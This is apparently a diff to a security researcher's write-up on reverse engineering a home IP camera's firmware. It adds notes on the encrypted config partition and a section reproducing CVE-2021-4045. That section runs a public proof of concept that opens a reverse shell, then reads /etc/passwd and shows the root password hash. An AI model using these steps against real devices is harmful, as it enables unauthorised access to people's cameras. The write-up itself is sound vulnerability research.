@@ -323,7 +323,11 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 So `boot`, `factory_boot`, and `kernel` have some LZMA compressed data, which we might be able to uncompress with `7z`.
 
 `config` partition doesn't contain any parts that `file` or `binwalk` are able to recognize, while `binwalk` entropy plot shows that the beginning of the partition containing data has very high entropy, so it may be encrypted.
+
 ![](screenshots/spi-flash-config-entropy.png)
+
+Luckily, there is already pre-existing literature about decrypting the `config` partition, done by [DrmnSamoLiu](https://github.com/DrmnSamoLiu).
+This should help us to be able to view the stored configuration.
 
 Extracted partitions:
 | partition name | link                                                            | notes                                      |
@@ -331,7 +335,7 @@ Extracted partitions:
 | `factory_boot` | [spi-flash-factory_boot.bin](./data/spi-flash-factory_boot.bin) | could this contain some more fancy u-boot? |
 | `factory_info` | [spi-flash-factory_info.bin](./data/spi-flash-factory_info.bin) | contains some plain strings                |
 | `art`          | [spi-flash-art.bin](./data/spi-flash-art.bin)                   | related to WiFi hardware                   |
-| `config`       | [spi-flash-config.bin](./data/spi-flash-config.bin)             | possibly encrypted data                    |
+| `config`       | [spi-flash-config.bin](./data/spi-flash-config.bin)             | encrypted configuration data               |
 | `boot`         | [spi-flash-boot.bin](./data/spi-flash-boot.bin)                 | probably u-boot binary                     |
 | `kernel`       | [spi-flash-kernel.bin](./data/spi-flash-kernel.bin)             | kernel binary                              |
 | `rootfs`       | [spi-flash-rootfs.bin](./data/spi-flash-rootfs.bin)             | squashfs                                   |
@@ -1058,6 +1062,58 @@ $ readelf -d cloud-client | grep NEEDED
  0x00000001 (NEEDED)                     Shared library: [libc.so.0]
 ```
 
+## Reproducing `CVE-2021-4045`
+
+### Original firmware
+
+It was trivial to reproduce `CVE-2021-4045` on a new out-of-the-box C200 with firmware version 1.1.14 by using [hacefresko](https://github.com/hacefresko)'s [PoC](https://github.com/hacefresko/CVE-2021-4045-PoC).
+
+```console
+$ python3 pwntapo.py shell 192.168.1.52 192.168.1.75
+
+  CVE-2021-4045 PoC  _   @hacefresko                 
+ _ ____      ___ __ | |_ __ _ _ __   ___  
+| '_ \ \ /\ / / '_ \| __/ _` | '_ \ / _ \ 
+| |_) \ V  V /| | | | || (_| | |_) | (_) |
+| .__/ \_/\_/ |_| |_|\__\__,_| .__/ \___/ 
+|_|                          |_|          
+
+[+] Listening on port 1337...
+[+] Sending reverse shell to 192.168.1.52...
+
+Listening on 0.0.0.0 1337
+Connection received on _gateway 57605
+/bin/sh: can't access tty; job control turned off
+
+
+BusyBox v1.19.4 (2021-08-25 12:40:18 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/ # uname -a
+Linux SLP 3.10.27 #2 PREEMPT Wed Aug 25 12:57:38 CST 2021 rlx GNU/Linux
+/ # cat /etc/openwrt_release
+DISTRIB_ID="OpenWrt"
+DISTRIB_RELEASE="Attitude Adjustment"
+DISTRIB_REVISION="6f12459b6106cba8b41e34bcd357b1fb177edf2f"
+DISTRIB_CODENAME="attitude_adjustment"
+DISTRIB_TARGET="realtek/generic"
+DISTRIB_DESCRIPTION="OpenWrt Attitude Adjustment 12.09-rc1"
+/ # cat /etc/passwd
+root:$1$QhxxhIXI$w5srjXWcEn1.D0geuDaUa.:0:0:root:/root:/bin/ash
+nobody:*:65534:65534:nobody:/var:/bin/false
+admin:*:500:500:admin:/var:/bin/false
+guest:*:500:500:guest:/var:/bin/false
+ftp:*:55:55:ftp:/home/ftp:/bin/false
+/ # 
+
+```
+
+The RTSP stream version of the exploit works as well.
+
+### Upgraded firmware
+The exploit doesn't work after upgrading device firmware to the latest available version, which at the time of writing was 1.1.19.
+During initial setup, the device offered to do automatic updates, so unless a user intentionally wants to remain insecure, the vulnerability is mitigated soon after installing the device.
+
 ## References
 ### Literature
 [hacefresko](https://github.com/hacefresko)'s great post about the same device was very useful for getting initial access:
@@ -1071,6 +1127,10 @@ FCC database contains some good pictures of the PCBs, which were used to check i
 
 Hanna Gustafsson and Hanna Kvist have written a Master's thesis paper containing information about the device:
 [thesis paper](https://www.diva-portal.org/smash/get/diva2:1679623/FULLTEXT01.pdf)
+
+Youtube video by `stacksmashing` which was used as a guide on getting started with `Ghidra`: [Reverse engineering with #Ghidra: Breaking an embedded firmware encryption scheme](https://youtu.be/4urMITJKQQs)
+
+Website by `DrmnSamoLiu` explaining how to decrypt the `config` partition (also contains a lot more information about reverse engineering the C200): [link](https://drmnsamoliu.github.io/userconfig.html)
 
 ### Used tools
 - [`minicom`](https://linux.die.net/man/1/minicom)
